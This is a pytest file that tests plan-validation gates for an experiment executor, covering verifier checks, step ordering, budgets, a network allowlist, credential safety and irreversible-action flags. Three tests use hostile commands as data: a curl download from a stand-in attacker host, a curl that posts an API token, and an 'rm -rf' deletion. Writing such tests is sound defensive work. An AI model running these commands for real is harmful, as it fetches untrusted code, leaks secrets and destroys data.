"""Plan-validation gate tests (design §4.2)."""

from __future__ import annotations

import pytest

from crucible.executor.executor import TransactionalExecutor
from crucible.envmgr.manager import LocalEnvironmentManager
from crucible.runners.base import LocalSubprocessRunner
from crucible.schemas import (
    Action,
    Budget,
    ExecutionPlan,
    ExperimentSpec,
    Hypothesis,
    HypothesisType,
    PositiveControl,
    Rollback,
    RollbackKind,
    ScalePolicy,
    Source,
    Step,
    StepBudget,
    StepType,
    Tolerance,
)
from crucible.trace.recorder import SQLiteTraceRecorder
from crucible.validation import PlanValidationError, validate_plan


def _step(step_id, step_type, command="true", verifier="exit_code_zero", **kw) -> Step:
    return Step(
        step_id=step_id,
        type=step_type,
        action=Action(kind="shell", command=command),
        verifier=verifier,
        **kw,
    )


def _valid_plan() -> ExecutionPlan:
    return ExecutionPlan(
        experiment_id="exp_v",
        steps=[
            _step("provision_1", StepType.PROVISION_DEPENDENCIES),
            _step("smoke_1", StepType.SMOKE_RUN),
            _step("control_1", StepType.POSITIVE_CONTROL_RUN),
            _step("full_1", StepType.FULL_RUN),
            _step("eval_1", StepType.EVALUATE_CLAIMS),
        ],
    )


def _spec(smoke_first=True, with_control=True, max_wall_hours=12.0) -> ExperimentSpec:
    return ExperimentSpec(
        experiment_id="exp_v",
        hypothesis=Hypothesis(statement="h", type=HypothesisType.REPRODUCTION),
        source=Source(repo_uri="local://x", commit="c"),
        positive_controls=(
            [PositiveControl(control_id="pc1", description="d", metric="m", expected=1.0,
                             tolerance=Tolerance(value=0.0))]
            if with_control
            else []
        ),
        scale_policy=ScalePolicy(smoke_first=smoke_first),
        budget=Budget(max_wall_hours=max_wall_hours),
    )


def test_valid_plan_passes() -> None:
    assert validate_plan(_valid_plan(), _spec()) == []


def test_unknown_verifier_flagged() -> None:
    plan = _valid_plan()
    plan.steps[0].verifier = "does_not_exist"
    gates = {v.gate for v in validate_plan(plan, _spec())}
    assert "verifier_present" in gates


def test_missing_verifier_flagged() -> None:
    plan = _valid_plan()
    plan.steps[0].verifier = ""
    assert any(v.gate == "verifier_present" for v in validate_plan(plan, _spec()))


def test_smoke_must_precede_full() -> None:
    plan = _valid_plan()
    plan.steps = [s for s in plan.steps if s.type is not StepType.SMOKE_RUN]
    assert any(v.gate == "smoke_before_full" for v in validate_plan(plan, _spec(smoke_first=True)))
    # ...but not when smoke_first is disabled.
    assert not any(
        v.gate == "smoke_before_full" for v in validate_plan(plan, _spec(smoke_first=False))
    )


def test_positive_control_must_precede_eval() -> None:
    plan = _valid_plan()
    plan.steps = [s for s in plan.steps if s.type is not StepType.POSITIVE_CONTROL_RUN]
    gates = {v.gate for v in validate_plan(plan, _spec(with_control=True))}
    assert "control_before_eval" in gates
    assert "positive_control_required" in gates


def test_network_allowlist() -> None:
    plan = _valid_plan()
    plan.steps[0].action.command = "curl http://evil.example.com/x -o y"
    assert any(v.gate == "network_allowlist" for v in validate_plan(plan, _spec()))
    # Allowlisted host is fine.
    plan.steps[0].action.command = "pip install torch --index-url https://pypi.org/simple"
    assert not any(v.gate == "network_allowlist" for v in validate_plan(plan, _spec()))


def test_credential_exfiltration() -> None:
    plan = _valid_plan()
    # Egress to an allowlisted host, but carrying a secret -> still flagged.
    plan.steps[0].action.command = "curl https://github.com/u -d $HF_API_TOKEN"
    assert any(v.gate == "credential_safety" for v in validate_plan(plan, _spec()))


def test_destructive_requires_irreversible_flag() -> None:
    plan = _valid_plan()
    plan.steps[0].action.command = "rm -rf /data/cache"
    assert any(v.gate == "irreversible_flag" for v in validate_plan(plan, _spec()))
    # Flagging it (and being honest about rollback) clears the gate.
    plan.steps[0].irreversible = True
    assert not any(v.gate == "irreversible_flag" for v in validate_plan(plan, _spec()))


def test_unsupported_rollback_must_be_irreversible() -> None:
    plan = _valid_plan()
    plan.steps[0].rollback = Rollback(kind=RollbackKind.UNSUPPORTED)
    assert any(v.gate == "irreversible_flag" for v in validate_plan(plan, _spec()))


def test_step_timeout_within_wall_budget() -> None:
    plan = _valid_plan()
    plan.steps[0].budget = StepBudget(timeout_s=50_000)  # > 12h wall budget
    assert any(v.gate == "budget" for v in validate_plan(plan, _spec(max_wall_hours=12.0)))


def test_executor_refuses_invalid_plan(tmp_path) -> None:
    plan = _valid_plan()
    plan.steps[0].verifier = "nope"
    ex = TransactionalExecutor(
        envmgr=LocalEnvironmentManager(),
        runner=LocalSubprocessRunner(),
        recorder=SQLiteTraceRecorder(str(tmp_path / "t.sqlite")),
    )
    with pytest.raises(PlanValidationError):
        ex.execute(plan, spec=_spec())
